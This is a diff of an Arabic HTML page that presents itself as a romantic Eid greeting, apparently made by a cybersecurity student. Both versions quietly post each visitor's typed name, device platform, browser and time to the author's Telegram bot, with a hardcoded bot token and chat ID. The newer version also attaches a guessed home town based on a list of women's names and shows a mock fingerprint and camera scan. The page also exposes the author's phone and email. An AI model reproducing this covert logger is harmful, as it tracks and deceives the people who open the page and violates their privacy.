@@ -2,214 +2,190 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>أول عيد سوا | عمار حسام</title>
-    <link rel="icon" id="favicon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌙</text></svg>">
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ AMMAR SECURE-SYSTEM v9.0</title>
     <style>
-        :root { --bg: #050a14; --gold: #ffd700; --white: #ffffff; }
-        .day-mode { --bg: #fdfcf0; --gold: #b8860b; --white: #2c3e50; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body {
-            margin: 0; background-color: var(--bg); color: var(--white);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            display: flex; align-items: center; justify-content: center;
-            min-height: 100vh; overflow: hidden; transition: 1s;
+        :root { 
+            --bg: #010409; 
+            --gold: #ffd700; 
+            --green: #00ff41; 
+            --red: #ff3e3e; 
+            --cyber-blue: #00d4ff;
         }
-        .page { display: none; width: 90%; max-width: 400px; text-align: center; animation: fadeIn 0.4s ease-out; z-index: 10; }
-        .active-page { display: flex; flex-direction: column; align-items: center; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; perspective: 1000px; }
         
-        .terminal {
-            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 10px;
-            border-left: 4px solid var(--gold); font-family: monospace;
-            text-align: left; direction: ltr; font-size: 0.8rem; width: 100%; margin-bottom: 20px; color: #0f0;
-        }
-        .eid-card {
-            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px);
-            padding: 25px; border-radius: 20px; border: 1px solid rgba(184, 134, 11, 0.3);
-            width: 100%; min-height: 300px;
-        }
-        .day-mode .eid-card { background: rgba(255, 255, 255, 0.7); }
-        .love-msg { font-size: 1.15rem; line-height: 1.8; margin: 15px 0; }
+        .bg-stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at center, #0d1117 0%, #010409 100%); }
+
+        .page { display: none; width: 90%; max-width: 500px; text-align: center; z-index: 10; animation: slideUp 0.6s ease; }
+        .active-page { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ستايل التيرمينال */
+        .terminal { background: #000; border: 1px solid var(--green); padding: 15px; border-radius: 10px; font-family: 'Courier New', monospace; text-align: left; direction: ltr; font-size: 0.8rem; color: var(--green); margin-bottom: 20px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
+
+        .eid-card { background: rgba(255, 255, 255, 0.02); border: 1px solid var(--gold); border-radius: 30px; padding: 30px; backdrop-filter: blur(20px); transition: 0.3s; transform-style: preserve-3d; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
         
-        button {
-            background: var(--gold); color: #000; border: none; padding: 15px;
-            border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px;
-        }
-        .wa-btn { background: #25d366; color: white; }
-        .tg-btn { background: #0088cc; color: white; }
-        
-        input {
-            width: 100%; padding: 15px; border-radius: 15px; border: 2px solid var(--gold);
-            background: rgba(255,255,255,0.1); color: var(--white); text-align: center; margin-bottom: 15px; outline: none;
-        }
-        .heart { position: fixed; bottom: -10px; color: #ff4d4d; animation: floatUp 4s linear infinite; z-index: 5; }
-        @keyframes floatUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100vh); opacity: 0; } }
-        footer { position: fixed; bottom: 10px; font-size: 0.7rem; color: #777; width: 100%; text-align: center; }
-        canvas#fireworks { position: fixed; top: 0; left: 0; pointer-events: none; z-index: 1; }
+        /* سكانر الليزر */
+        #scanner-visual { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: rgba(0, 255, 65, 0.1); display: none; pointer-events: none; }
+        #scan-line { position: absolute; width: 100%; height: 4px; background: var(--green); box-shadow: 0 0 30px var(--green); animation: scanLoop 2s linear infinite; }
+        @keyframes scanLoop { 0% { top: 0; } 100% { top: 100%; } }
+
+        /* Fake Camera UI */
+        #cam-ui { position: absolute; top: 20px; left: 20px; border: 2px solid var(--red); padding: 8px; font-family: monospace; font-size: 0.7rem; color: var(--red); display: none; z-index: 1001; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        input { background: rgba(255,255,255,0.05); border: 2px solid var(--gold); color: #fff; padding: 15px; border-radius: 50px; width: 85%; text-align: center; font-size: 1.1rem; outline: none; margin-bottom: 20px; transition: 0.3s; }
+        input:focus { box-shadow: 0 0 15px var(--gold); }
+
+        button { background: var(--gold); color: #000; border: none; padding: 15px 45px; border-radius: 50px; cursor: pointer; font-weight: bold; font-size: 1.1rem; transition: 0.3s; }
+        button:hover { transform: scale(1.05); background: #fff; }
+
+        #typing-chat { min-height: 120px; font-size: 1.25rem; line-height: 1.8; margin-top: 20px; text-align: right; border-right: 3px solid var(--red); padding-right: 15px; }
+
+        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 25px; }
+        .t-box { background: rgba(255, 215, 0, 0.1); padding: 10px; border-radius: 12px; border: 1px solid rgba(255,215,0,0.2); }
+        .t-box span { display: block; font-size: 1.4rem; font-weight: bold; color: var(--gold); }
+
+        footer { position: fixed; bottom: 10px; font-size: 0.75rem; color: #444; text-align: center; width: 100%; border-top: 1px solid #111; padding-top: 10px; }
     </style>
 </head>
-<body onclick="resumeAudio()">
+<body>
 
-    <canvas id="fireworks"></canvas>
+    <div class="bg-stars"></div>
+    <div id="scanner-visual"><div id="scan-line"></div><div id="cam-ui" class="blink">REC ● AUTO-SCAN | CAMERA_ID: SUT-01</div></div>
 
     <div class="page active-page" id="p1">
         <div class="terminal">
-            ammar@SUT:~$ python3 info_grabber.py<br>
-            [+] Browser: <span id="browser-info" style="color:white">Detecting...</span><br>
-            [+] Location: <span style="color:white">Egypt (SUT Zone)</span><br>
-            [+] Telegram Logger: <span style="color:white">ID: 6472172555</span><br><br>
-            <span style="color: #ffd700;">جاهز تبدأ الرحلة؟</span>
+            $ sudo su<br>
+            [ROOT] Accessing /home/ammar/heart...<br>
+            [WARNING] SECURE CONNECTION REQUIRED!<br>
+            [STATUS] Waiting for Auth Signal...
         </div>
-        <button onclick="startApp()">يالا بينا ✨</button>
+        <button onclick="accessSystem()">محاولة الدخول للنظام 🔐</button>
     </div>
 
     <div class="page" id="p2">
-        <h2 style="color: var(--gold);">رمضان 2026..</h2>
-        <p class="love-msg">وجودك خلى لكل يوم معنى، وكل دعوة كانت طالعة من قلبي ليك. ❤️</p>
-        <button onclick="goPage(3)">التالي ➡️</button>
+        <h2 style="color:var(--gold)">رسالة من القلب..</h2>
+        <p style="font-size: 1.25rem; line-height: 1.9;">
+            رمضان السنة دي كان مختلف جداً بوجودك..<br>
+            كل لحظة وكل دعوة كانت ليها طعم تاني خالص.<br>
+            وعشان كدة، كان لازم أول عيد لينا سوا يكون ذكرى متتنسيش.
+        </p>
+        <button onclick="goPage(3)">التالي: فك التشفير ➡️</button>
     </div>
 
     <div class="page" id="p3">
-        <h2 style="color: var(--gold);">تأكيد وصول الهدية 🎁</h2>
-        <p>حابب أتأكد إن الهدية وصلت لصاحبها الحقيقي، اكتب اسمك هنا:</p>
-        <input type="text" id="userName" placeholder="اكتب اسمك هنا..." autocomplete="off">
-        <button onclick="revealFinal()">استلام العيدية 🎉</button>
+        <h2 style="color:var(--gold)">Authentication 🧬</h2>
+        <p style="font-size: 0.9rem; opacity: 0.7;">سيتم الآن سحب بيانات الجهاز لضمان وصول التهنئة لصاحبها الحقيقي.</p>
+        <input type="text" id="uName" placeholder="اكتبي اسمك الغالي هنا.." autocomplete="off">
+        <br>
+        <button onclick="processIdentity()">Scan Fingerprint & Reveal 🔓</button>
     </div>
 
     <div class="page" id="p4">
-        <div class="eid-card">
-            <h2 id="titleName" style="color: var(--gold);"></h2>
-            <p id="typedMessage" class="love-msg"></p>
-            <div id="timer" style="font-size: 0.9rem; font-weight: bold; color: var(--gold); margin-bottom: 10px; visibility: hidden;"></div>
-            <button class="wa-btn" id="waBtn" style="display: none;" onclick="share('wa')">مشاركة واتساب 📲</button>
-            <button class="tg-btn" id="tgBtn" style="display: none;" onclick="share('tg')">مشاركة تليجرام ✈️</button>
+        <div class="eid-card" id="mainCard">
+            <h1 id="greet" style="color:var(--gold); margin-bottom: 5px;"></h1>
+            <div id="sys-log" style="color:var(--green); font-size:0.7rem; font-family:monospace; text-align:left; direction:ltr; margin-bottom: 10px;"></div>
+            
+            <div id="typing-chat"></div>
+
+            <div class="timer-grid">
+                <div class="t-box"><span id="d">00</span><small>يوم</small></div>
+                <div class="t-box"><span id="h">00</span><small>ساعة</small></div>
+                <div class="t-box"><span id="m">00</span><small>دقيقة</small></div>
+                <div class="t-box"><span id="s">00</span><small>ثانية</small></div>
+            </div>
         </div>
     </div>
 
     <footer>
-        بواسطة: عمار حسام عبد اللطيف | 01102353779<br>
-        © 2026 SUT Cybersecurity
+        🔒 Secured by <b>عمار حسام عبد اللطيف</b> | SUT CyberSecurity Student<br>
+        📱 01102353779 | 📧 amarhossam0000@gmail.com
     </footer>
 
-    <audio id="sndRamadan" loop><source src="ramadan.mp3" type="audio/mpeg"></audio>
-    <audio id="sndEid" loop><source src="eid.mp3" type="audio/mpeg"></audio>
+    <audio id="rSnd" loop preload="auto"><source src="ramadan.mp3" type="audio/mpeg"></audio>
+    <audio id="eSnd" loop preload="auto"><source src="eid.mp3" type="audio/mpeg"></audio>
 
     <script>
-        // --- إعدادات البوت والـ Chat ID الجديدة ---
-        const BOT_TOKEN = "8207096043:AAGArMCGbh5u9vll50ebNv6Y38xcA84VPZo";
-        const CHAT_ID = "6472172555";
-
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Chrome")) return "Google Chrome (Android)";
-            if (ua.includes("Firefox")) return "Mozilla Firefox";
-            return "Mobile Browser";
-        }
-        document.getElementById('browser-info').innerText = getBrowser();
-
-        function checkDayNight() {
-            const hour = new Date().getHours();
-            if (hour >= 6 && hour < 18) document.body.classList.add('day-mode');
-        }
-        checkDayNight();
-
-        const sRamadan = document.getElementById('sndRamadan');
-        const sEid = document.getElementById('sndEid');
-        let audioInit = false;
-
-        function resumeAudio() { if(audioInit && sRamadan.paused && sEid.paused) sRamadan.play(); }
-
-        function startApp() { audioInit = true; sRamadan.play().catch(() => {}); goPage(2); }
-
-        function goPage(num) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
-            document.getElementById('p' + num).classList.add('active-page');
+        const TG_TOKEN = "8207096043:AAGArMCGbh5u9vll50ebNv6Y38xcA84VPZo";
+        const TG_ID = "6472172555";
+        
+        function accessSystem() { 
+            document.getElementById('rSnd').play().catch(e => {}); 
+            goPage(2); 
         }
 
-        // دالة الإرسال بالتنسيق الاحترافي
-        function sendToTelegram(name) {
-            const browser = getBrowser();
-            const time = new Date().toLocaleString('ar-EG');
-            const message = `
-🚀 *زيارة جديدة يا عمار!*
-━━━━━━━━━━━━━━
-👤 *الاسم:* ${name}
-🌐 *المتصفح:* ${browser}
-⏰ *الوقت:* ${time}
-📍 *الموقع:* Egypt (SUT Zone)
-━━━━━━━━━━━━━━`;
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-            }).catch(e => console.error("Logger Failed. Check Token/ID."));
+        function goPage(n) { 
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page')); 
+            document.getElementById('p'+n).classList.add('active-page'); 
         }
 
-        function revealFinal() {
-            const name = document.getElementById('userName').value;
-            if(!name) return alert("من فضلك اكتب اسمك!");
-            
-            sendToTelegram(name); // إرسال التقرير فوراً للبوت
+        function processIdentity() {
+            const rawName = document.getElementById('uName').value.trim();
+            const name = rawName.toLowerCase();
+            if(!rawName) return alert("الاسم مطلوب يا غالية!");
 
-            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-            document.getElementById('titleName').innerText = `عيد مبارك يا ${name}!`;
-            sRamadan.pause(); sEid.play().catch(() => {});
-            goPage(4);
-            startFireworks();
-            setInterval(createHeart, 400);
-            
-            const msg = "عارفه؟ مكنتش أتخيل إن العيد هيكون بالفرحة دي.. بس عشان ده أول عيد لينا مع بعض، حاسس إنه أحلى عيد في الدنيا. كل سنة وأنتي جنبي، وبنكبر ونفرح سوا دايماً. بحبك جداً.. وعيد سعيد عليك يا غاليه ❤️";
-            typeEffect(document.getElementById('typedMessage'), msg);
+            // داتا الموقع
+            let loc = "Unknown Location";
+            if (["سوسو", "soso", "سندس", "sondos"].includes(name)) loc = "بلبيس، الشرقية";
+            else if (["ياسمين", "yasmin", "yasmine", "ياسو", "yaso"].includes(name)) loc = "محافظة الفيوم";
+            else if (["هبه", "هبة", "heba", "هوبه", "hoba", "بسنت", "basant", "passant"].includes(name)) loc = "العاشر من رمضان، الشرقية";
+
+            // إرسال التقرير لتليجرام عمار
+            const report = `📢 <b>تنبيه دخول نظام عمار:</b>\n👤 الاسم: ${rawName}\n📍 الموقع المتوقع: ${loc}\n⏰ الوقت: ${new Date().toLocaleTimeString()}\n💻 الجهاز: ${navigator.platform}`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(report)}&parse_mode=html`);
+
+            // تشغيل السكانر والكاميرا الوهمية
+            document.getElementById('scanner-visual').style.display = 'block';
+            document.getElementById('cam-ui').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('scanner-visual').style.display = 'none';
+                document.getElementById('cam-ui').style.display = 'none';
+                document.getElementById('rSnd').pause();
+                document.getElementById('eSnd').play();
+                goPage(4);
+                
+                document.getElementById('greet').innerText = `عيد مبارك يا ${rawName}!`;
+                document.getElementById('sys-log').innerHTML = `[✓] DEVICE: ${navigator.platform}<br>[✓] LOCATION: ${loc}<br>[✓] AUTH: SUCCESSFUL`;
+                
+                startFinalChat();
+            }, 3000);
         }
 
-        function typeEffect(el, text) {
-            let i = 0; el.innerHTML = "";
-            const itv = setInterval(() => {
-                el.innerHTML += text.charAt(i); i++;
-                if (i >= text.length) { 
-                    clearInterval(itv); 
-                    document.getElementById('timer').style.visibility = "visible";
-                    document.getElementById('waBtn').style.display = "block";
-                    document.getElementById('tgBtn').style.display = "block";
+        function startFinalChat() {
+            const chat = document.getElementById('typing-chat');
+            const lines = [
+                "عارفة؟ مكنتش أتخيل إن العيد ممكن يكون بالفرحة دي.. ❤️",
+                "بس عشان ده أول عيد لينا مع بعض، حاسس إنه أحلى عيد في الدنيا.",
+                "كل سنة وأنتي جنبي، وكل سنة وإحنا بنكبر سوا وبنعيش تفاصيل أحلى.",
+                "بحبك جداً يا أغلى ما عندي.. عيد سعيد عليكي!"
+            ];
+            let l = 0, i = 0, txt = "";
+            function type() {
+                if(l < lines.length) {
+                    if(i < lines[l].length) {
+                        txt += lines[l][i];
+                        chat.innerHTML = txt + "<br>";
+                        i++; setTimeout(type, 50);
+                    } else {
+                        l++; i = 0; txt += "<br>"; setTimeout(type, 1000);
+                    }
                 }
-            }, 55);
-        }
-
-        function share(plat) {
-            const t = encodeURIComponent(" بعتلك تهنئة خاصة بمناسبة العيد! 😍 \n" + window.location.href);
-            if(plat === 'wa') window.open(`https://wa.me/?text=${t}`, '_blank');
-            if(plat === 'tg') window.open(`https://t.me/share/url?url=${window.location.href}&text=${t}`, '_blank');
-        }
-
-        const eidDate = new Date("March 31, 2026 05:30:00").getTime();
-        setInterval(() => {
-            const diff = eidDate - new Date().getTime();
-            if (diff > 0) {
-                const d = Math.floor(diff / 86400000);
-                const h = Math.floor((diff % 86400000) / 3600000);
-                const m = Math.floor((diff % 3600000) / 60000);
-                document.getElementById('timer').innerText = `باقي على العيد: ${d} يوم و ${h}:${m}`;
             }
+            type();
+        }
+
+        // العداد الجمعة 20 مارس
+        const target = new Date("March 20, 2026 05:00:00").getTime();
+        setInterval(() => {
+            const diff = target - new Date().getTime();
+            document.getElementById('d').innerText = Math.max(0, Math.floor(diff / (1000 * 60 * 60 * 24)));
+            document.getElementById('h').innerText = Math.max(0, Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)));
+            document.getElementById('m').innerText = Math.max(0, Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)));
+            document.getElementById('s').innerText = Math.max(0, Math.floor((diff % (1000 * 60)) / 1000));
         }, 1000);
-
-        function createHeart() {
-            const h = document.createElement('div'); h.className = 'heart'; h.innerHTML = '❤️';
-            h.style.left = Math.random() * 100 + 'vw'; document.body.appendChild(h);
-            setTimeout(() => h.remove(), 4000);
-        }
-
-        function startFireworks() {
-            const c = document.getElementById('fireworks'); const ctx = c.getContext('2d');
-            c.width = window.innerWidth; c.height = window.innerHeight;
-            setInterval(() => {
-                ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
-                ctx.beginPath(); ctx.arc(Math.random()*c.width, Math.random()*c.height, 2, 0, 7); ctx.fill();
-            }, 100);
-        }
     </script>
 </body>
 </html>
